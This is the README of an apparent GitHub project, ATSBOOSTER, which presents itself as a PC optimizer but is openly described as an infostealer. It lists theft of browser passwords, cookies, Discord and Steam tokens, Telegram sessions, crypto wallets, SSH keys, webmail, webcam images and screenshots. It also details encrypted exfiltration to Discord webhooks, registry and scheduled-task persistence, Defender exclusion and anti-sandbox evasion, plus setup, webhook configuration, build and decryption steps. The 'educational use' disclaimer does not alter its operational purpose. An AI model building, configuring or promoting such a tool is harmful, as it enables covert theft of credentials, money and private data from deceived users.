<div align="center">
  <br>
  <p>
    <img src="https://forthebadge.com/images/badges/made-with-python.svg">
    <img src="http://forthebadge.com/images/badges/built-with-love.svg">
  </p>
  <h1>ATSBOOSTER</h1>
  <p><strong>Token Grabber & Data Extractor for Windows</strong></p>
  <p>v1.0.4 - Encrypted payload, persistence, daily check, anti-sandbox, webmail extraction</p>
  <p>
    <img alt="GitHub contributors" src="https://img.shields.io/github/contributors/Dopiiii/ATSBOOSTER">
    <img alt="GitHub issues" src="https://img.shields.io/github/issues/Dopiiii/ATSBOOSTER">
    <img alt="GitHub pull requests" src="https://img.shields.io/github/issues-pr/Dopiiii/ATSBOOSTER">
    <img alt="GitHub commit activity" src="https://img.shields.io/github/commit-activity/m/Dopiiii/ATSBOOSTER">
    <img src="https://img.shields.io/badge/PRs-welcome-brightgreen.svg?style=shields">
  </p>
  <p align="center">
    <a href="#overview">Overview</a> &bull;
    <a href="#features">Features</a> &bull;
    <a href="#installation">Installation</a> &bull;
    <a href="#usage">Usage</a> &bull;
    <a href="#configuration">Configuration</a> &bull;
    <a href="#build">Build</a> &bull;
    <a href="#compatibility">Compatibility</a> &bull;
    <a href="#disclaimer">Disclaimer</a> &bull;
    <a href="#license">License</a>
  </p>
</div>

---

# Overview

ATSBOOSTER is a Windows data extraction tool disguised as a PC optimization utility. It presents a fake system optimizer interface with real performance scoring and real system optimizations, while silently collecting tokens, cookies, passwords, and system information from the target machine.

The tool uses a TUI (Text User Interface) with a menu offering "PC Boost", "Disable Optimization", and "Uninstall" options. When the user selects "Boost my PC", the program displays hardware analysis and performance scoring with animated progress bars while extracting data in the background.

Collected data is encrypted (AES-256-GCM) and sent to a Discord webhook. The tool persists itself on the system and checks daily for new data.

> **This tool does NOT bypass antivirus.** Windows Defender or any other AV will likely flag it. The program attempts to add itself to Defender's exclusion list via a scheduled task running as SYSTEM, but this will not work against third-party antivirus software.

# Features

## Data Extraction

| Target | Description |
|---|---|
| **Discord Tokens** | Extracts tokens from Discord's leveldb across all Chromium browsers and Discord local clients. Supports plaintext and encrypted (v10/v11) token decryption via DPAPI. Tokens are **validated** via Discord API to check if active, and retrieves username, email, phone, MFA status, Nitro, and verification. |
| **Twitter Tokens** | Grabs `auth_token` cookies from all installed browsers. |
| **Instagram Sessions** | Extracts `ds_user_id` and `sessionid` cookies. |
| **Netflix Cookies** | Full cookie extraction for Netflix account access. |
| **All Browser Cookies** | Extracts cookies from Chrome, Edge, Brave, Opera, Opera GX, Vivaldi, and Yandex across all profiles (up to 500 per profile). |
| **Chrome/Edge/Brave Passwords** | Decrypts saved passwords using AES-GCM with DPAPI key extraction. |
| **Firefox Passwords** | Extracts encrypted login data from Firefox profiles. |
| **Steam Accounts & Tokens** | Extracts SteamID, AccountName, PersonaName, RefreshToken, AccessToken, and SSFN guard files. |
| **Telegram Sessions** | Copies the entire `tdata` directory for session hijacking. |
| **Messaging Apps** | Copies data from Signal, Session, Element, Jami, Wire, Slack, and Microsoft Teams. |
| **FileZilla** | Extracts FTP credentials from `recentservers.xml` and `sitemanager.xml`. |
| **WinSCP** | Extracts saved sessions from `WinSCP.ini`. |
| **WiFi Passwords** | Extracts **all saved WiFi profiles** with SSID, password, authentication type, and cipher via `netsh wlan`. |
| **SSH Keys** | Copies all files from `~/.ssh/` directory. |
| **Crypto Wallets** | Copies wallet files for Bitcoin Core, Electrum, Exodus, Atomic, Monero GUI, and MetaMask extension data. |
| **Sensitive Files** | Scans Desktop, Documents, and Downloads for files matching keywords (password, bank, crypto, wallet, etc.) or extensions (.txt, .csv, .json, .xml, etc.). Intelligent file copying with size limits (50MB per file, 500MB per directory) and cache/temp filtering. |
| **Payment Info** | Checks Discord billing for credit cards and PayPal accounts. |
| **Browser History** | Extracts up to 200 most recent history entries. |
| **Bookmarks & Downloads** | Extracts browser bookmarks and download history. |
| **Product Keys** | Extracts Windows and software product keys via PowerShell. |
| **Autofill Data** | Extracts browser autofill data (cards, addresses, phone numbers). |
| **Clipboard** | Captures current clipboard content. |
| **Installed Software** | Lists all installed programs. |
| **Email Extraction** | Scans all collected data (Discord, browser passwords, autofill, PayPal, clipboard) for email addresses. Also scans Outlook, Thunderbird, and Windows Mail local files. |
| **Webmail Extraction** | Uses headless Chrome (via Selenium) with the user's existing browser profile to access Gmail, Outlook Web, Yahoo Mail, and ProtonMail. Extracts logged-in account emails, sender addresses, and recent email subjects. |
| **Screenshot** | Captures all monitors (multi-screen support) as PNG. |
| **Camera Snapshot** | Captures a single frame from the webcam (if available). |

## System Information Collected

- IP address, country, city (via multiple geo-IP APIs)
- MAC address
- HWID (Hardware UUID)
- CPU brand and clock speed
- RAM total
- Screen resolution
- OS platform
- **GPU** - model, driver version, VRAM
- **Motherboard** - manufacturer, product, serial number
- **BIOS** - manufacturer, serial number, version
- **Disk drives** - model, serial number, size
- Multi-monitor screenshots (all screens captured)
- Browser history
- Security tools detection (Wireshark, Nmap, Process Hacker, x64dbg, IDA, Ghidra, etc.)

## Delivery

- All collected data is packed into a ZIP file
- ZIP is **encrypted with AES-256-GCM**
- Encrypted file sent to Discord webhook(s)
- Decryption key included in the webhook embed
- **Multi-webhook support** - send to multiple webhooks with automatic fallback
- **Discord 25MB attachment limit handling** - if the payload exceeds 25MB, large sensitive files are automatically stripped and the webhook is retried
- **HTTP response validation** - webhook response codes are checked, with automatic retry on failure
- **Sensitive files in separate zip** - large sensitive files are packed in their own encrypted archive

## Persistence

- **Registry key** - `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\ATSBOOSTER`
- **Scheduled task** - `ATSBOOSTER_Daily` runs daily at 9am and at logon (hidden)
- **Hidden executable** - copied to `%APPDATA%\ATSBOOSTER\ATSBOOSTER.exe` with hidden file attribute
- **Daily check** - compares data hash with cached hash, only sends if new data detected
- **Anti-duplicate cache** - SHA-256 hash stored in `%APPDATA%\ATSBOOSTER\cache.hash`

## Anti-Sandbox

Detects virtual machines and sandboxes by checking:
- CPU core count (< 2 = suspicious)
- RAM total (< 3 GB = suspicious)
- System uptime (< 10 minutes = suspicious)
- MAC address OUI (VMware, VirtualBox, Hyper-V, Parallels)
- Username (sandbox, malware, virus, cuckoo, etc.)

If 3+ checks fail, the daily check silently exits without sending data.

## Disguise

- **Real hardware detection** - CPU, GPU, RAM, disks, motherboard, network
- **Real performance analysis** - animated progress bars for CPU, RAM, disk, processes, uptime
- **Real performance score** - computed from actual CPU usage, RAM usage, disk usage, process count, and uptime
- **Real system optimizations** - actually applied via PowerShell:
  - Disables hibernation, SysMain, DiagTrack, WSearch, print spooler, Fax, RetailDemo, RemoteRegistry
  - Sets Ultimate Performance power plan
  - Configures TCP settings, RSS, disables heuristics
  - Disables NTFS LastAccess updates
  - Enables disk write-cache
  - Flushes DNS cache
  - Cleans temp files
  - Runs DISM component cleanup
  - Disables CEIP and Compatibility Appraiser scheduled tasks
- Score displayed before and after optimization with improvement delta

# Installation

## Prerequisites

- **Windows 10/11** (x86, x86_64, arm64)
- **Python 3.9+**
- **Administrator privileges** required

## Steps

```bash
# 1. Clone the repository
git clone https://github.com/Dopiiii/ATSBOOSTER.git
cd ATSBOOSTER

# 2. Install dependencies
pip install -r requirements.txt

# 3. Configure your webhook (see Configuration section)

# 4. Run the program (as administrator)
python ATSBOOSTER.py
```

# Usage

## Interactive mode (default)

On launch, the program requests admin privileges and displays:

```
  MENU PRINCIPAL

  [1] Booster mon PC           - Optimiser les performances
  [2] Desactiver l'optimisation - Revenir aux parametres par defaut
  [3] Supprimer ATSBOOSTER     - Desinstaller le programme
  [Q] Quitter
```

- **Option 1** - Triggers data extraction in a background thread while showing real optimization. Installs persistence and Defender exclusion. Data is sent to the configured webhook(s).
- **Option 2** - Reverts the system changes made by Option 1.
- **Option 3** - Reverts all changes, removes Defender exclusions, removes persistence (registry + scheduled task), sends an uninstall notification to the webhook, and exits.
- **Q** - Quits the program.

## Silent mode

```bash
python ATSBOOSTER.py --silent
```

Extracts data, installs persistence, adds Defender exclusion, and exits silently (no TUI).

## Boost-only mode

```bash
python ATSBOOSTER.py --boost
```

Extracts and sends data immediately without installing persistence.

## Daily check mode (auto-triggered by scheduled task)

```bash
python ATSBOOSTER.py --daily
```

Runs anti-sandbox check, extracts data, compares hash with cache. Only sends to webhook if new data is detected. This is the mode used by the scheduled task for daily automatic checks.

# Configuration

## Setting your webhook(s)

Open `ATSBOOSTER.py` and modify the `WEBHOOK_URLS` list (line 49):

```python
WEBHOOK_URLS = [
    "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN",
    "https://discord.com/api/webhooks/BACKUP_WEBHOOK_ID/BACKUP_WEBHOOK_TOKEN",
]
```

Add as many webhooks as you want. If the first one fails, the tool tries the next one. To create a webhook:
1. Open Discord > Server Settings > Integrations > Webhooks
2. Click "New Webhook"
3. Copy the webhook URL

## Modifying target websites

Modify the `website` list (line 34):

```python
website = ["discord.com", "twitter.com", "instagram.com", "netflix.com"]
```

## Modifying the file grabber

- **Keywords**: Edit `FILE_GRABBER_KEYWORDS` 
- **Extensions**: Edit `FILE_GRABBER_EXTENSIONS`
- **Search directories**: Edit `FILE_GRABBER_DIRS`

## Modifying crypto wallet targets

Edit `CRYPTO_WALLET_PATHS` to add or remove wallet paths.

## Modifying messaging app targets

Edit `MESSAGING_PATHS` to add or remove messaging app paths (Signal, Session, Element, Jami, Wire, Slack, Teams).

## Modifying email client targets

Edit `EMAIL_PATHS` to add or remove email client paths (Outlook, Thunderbird, Mailbird).

## Modifying gaming/VPN/2FA targets

- **Gaming**: Edit `GAMING_PATHS` (Steam, Epic Games, Origin, Ubisoft, Battle.net, GOG, Riot)
- **VPN**: Edit `VPN_PATHS` (NordVPN, ProtonVPN, ExpressVPN, OpenVPN)
- **2FA**: Edit `AUTH_2FA_PATHS` (Authy, 2FA Desktop, WinAuth)

## Modifying the disguise

- **Banner**: Edit `show_banner()` function
- **Menu**: Edit `show_menu()` function
- **Optimizations**: Edit `optimize_pc()` and `restore_pc()` functions
- **Performance scoring**: Edit `compute_performance_score()` function

# Build

To compile into a standalone `.exe`:

```bash
# Method 1 - Python script
python build.py

# Method 2 - Batch file
build.bat
```

The `ATSBOOSTER.spec` file is provided for PyInstaller configuration.

> **Note:** The compiled executable will likely be flagged by antivirus software. This tool does not include any AV bypass mechanism.

## Decrypting collected data

Use the included `decrypt.py` utility to decrypt the encrypted ZIP files received via webhook:

```bash
python decrypt.py <file.zip.enc> <base64_key>
```

The decryption key is included in the Discord webhook embed.

# Compatibility

| Browser | Cookies & Tokens | Passwords |
|:--:|:--:|:--:|
| Chrome | ✅ | ✅ |
| Edge | ✅ | ✅ |
| Brave | ✅ | ✅ |
| Firefox | ✅ | ✅ |
| Opera (GX) | ✅ | ❌ |
| Vivaldi | ✅ | ❌ |
| Yandex | ✅ | ❌ |
| Chromium | ✅ | ❌ |

| Messaging App | Supported |
|:--:|:-------:|
| Telegram | ✅ |
| Signal | ✅ |
| Session | ✅ |
| Element | ✅ |
| Jami | ✅ |
| Wire | ✅ |
| Slack | ✅ |
| Microsoft Teams | ✅ |

| Webmail | Supported |
|:--:|:-------:|
| Gmail | ✅ |
| Outlook Web | ✅ |
| Yahoo Mail | ✅ |
| ProtonMail | ✅ |

| OS | Support |
|:--:|:-------:|
| Windows 10 | ✅ |
| Windows 11 | ✅ |
| Linux / macOS | ❌ |

# Disclaimer

> **WARNING: This tool is for personal and educational use ONLY.**
>
> - You must only use this tool on your own machines or with explicit permission from the owner.
> - Unauthorized use of this tool to access other people's accounts, tokens, or data is **illegal**.
> - This tool does **NOT** bypass antivirus software. It will be detected by Windows Defender and third-party AVs.
> - The author declines any responsibility for misuse of this code.
> - By using this tool, you accept full responsibility for your actions.

# Contributing

Contributions are welcome! Please read the [contribution guidelines](CONTRIBUTING.md) first.

## Authors

<a href="https://github.com/Dopiiii/ATSBOOSTER/graphs/contributors">
  <img src="https://contrib.rocks/image?repo=Dopiiii/ATSBOOSTER" />
</a>
<br>
<br>

> **Working on your first Pull Request?** You can learn how from this *free* series [How to Contribute to an Open Source Project on GitHub](https://kcd.im/pull-request)

# License

This project is licensed under the terms of the [LICENSE](LICENSE.md) file.
